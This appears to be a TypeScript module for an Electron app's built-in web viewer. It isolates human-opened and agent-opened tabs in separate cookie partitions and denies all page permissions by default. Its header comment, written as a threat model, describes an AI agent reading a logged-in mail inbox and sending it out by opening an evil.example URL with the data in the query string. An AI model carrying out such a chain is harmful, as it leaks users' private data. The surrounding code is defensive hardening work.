/**
 * webViewerPartitions — the viewer's TWO cookie jars, and their hardening.
 *
 * Splitting the jar is not tidiness, it closes a zero-click exfiltration chain
 * that needs no drive grant at all. With one shared partition: an agent opens
 * `https://mail.google.com` in the background (the user sees only a tab-strip
 * row), `read_web_tab(include:['text'])` returns the authenticated inbox, and the
 * agent opens `https://evil.example/?d=<data>` — which is http(s) and so passes
 * the only URL policy. Every step is a "free" operation. Splitting the jar
 * removes the FIRST step rather than gating the third.
 *
 *  - `persist:cyboflow-web-viewer` — tabs the HUMAN opened. Holds logins. An
 *    agent reading DOM / text / a screenshot from one of these needs a grant.
 *  - `cyboflow-web-agent-<sessionId>` — tabs an AGENT opened. Ephemeral (no
 *    `persist:` prefix), one per cyboflow session, gone on quit. Agent observe
 *    here is free, which keeps the common case — its own dev server, a docs
 *    page, a preview URL — frictionless.
 *
 * Per-session rather than one shared agent jar: pages in a partition share a
 * session, so a single agent jar would let one session's incidental credentials
 * reach another session's runs even before the `human_touched` tripwire fires.
 *
 * A tab's partition is fixed at creation from `openedBy` and NEVER changes, so
 * an agent navigating its own tab to an authenticated origin lands there logged
 * out.
 *
 * See docs/proposals/native-web-viewer.md §2 and §3.1.
 */
import { session as electronSession, type Session } from 'electron';

/** The human partition. `persist:` → survives a restart, so logins stick. */
export const HUMAN_PARTITION = 'persist:cyboflow-web-viewer';

/**
 * The human partition when `persistLogin` is off: same isolation, no disk.
 * A distinct name, not the same string without `persist:`, so flipping the
 * setting cannot half-adopt an existing on-disk jar.
 */
export const HUMAN_EPHEMERAL_PARTITION = 'cyboflow-web-viewer-ephemeral';

/** The per-session agent partition. Ephemeral by the absence of `persist:`. */
export function agentPartition(sessionId: string): string {
  // Session ids are uuids from the app's own database, but sanitize anyway: the
  // string becomes a partition NAME, and a stray `persist:` prefix inside it
  // would silently make an agent jar durable.
  return `cyboflow-web-agent-${sessionId.replace(/[^A-Za-z0-9_-]/g, '')}`;
}

/** Which partition a tab gets, decided once at creation. */
export function partitionFor(
  openedBy: 'user' | 'agent',
  sessionId: string,
  persistLogin: boolean,
): string {
  if (openedBy === 'agent') return agentPartition(sessionId);
  return persistLogin ? HUMAN_PARTITION : HUMAN_EPHEMERAL_PARTITION;
}

/**
 * Permissions a viewer page may have. EMPTY in v1 — a remote page in the app's
 * own window has no business with the camera, the microphone, the clipboard or
 * the filesystem, and none of the named use cases (docs, previews, localhost dev
 * servers, Claude artifacts) needs one.
 */
const ALLOWED_PERMISSIONS: ReadonlySet<string> = new Set<string>();

/** Partitions already hardened, so repeat opens do not re-register handlers. */
const hardened = new Set<string>();

/**
 * Apply the deny-by-default policy to a partition. Idempotent per partition.
 *
 * The two permission handlers have DIFFERENT shapes and both are required:
 * `setPermissionCheckHandler` returns a boolean (it answers synchronous
 * `permissions.query`-style checks), while `setPermissionRequestHandler` returns
 * `void` and answers through its callback. A boolean returned from the request
 * handler grants nothing — the request just never resolves — so registering only
 * one leaves a live hole or a hang.
 *
 * The deny set has to cover more than camera/mic/geolocation: `fileSystem`
 * (local disk), `openExternal` (an OS launch from a remote page) and
 * `display-capture` (screen recording) are all permissions, and all three are
 * worse than a webcam prompt.
 */
export function hardenPartition(partition: string): Session {
  const ses = electronSession.fromPartition(partition);
  if (hardened.has(partition)) return ses;
  hardened.add(partition);

  ses.setPermissionCheckHandler((_wc, permission) => ALLOWED_PERMISSIONS.has(permission));
  ses.setPermissionRequestHandler((_wc, _permission, callback) => {
    callback(false);
  });
  // navigator.hid / navigator.usb / navigator.serial device selection.
  ses.setDevicePermissionHandler(() => false);
  // getDisplayMedia(). Answering with an empty Streams object is the documented
  // way to refuse; the handler returns void like the request handler above.
  ses.setDisplayMediaRequestHandler((_request, callback) => {
    callback({});
  });

  return ses;
}

/** Forget a partition's hardening bookkeeping (session teardown). */
export function forgetPartition(partition: string): void {
  hardened.delete(partition);
}

/** Test seam: drop all hardening bookkeeping. */
export function resetPartitionHardeningForTests(): void {
  hardened.clear();
}
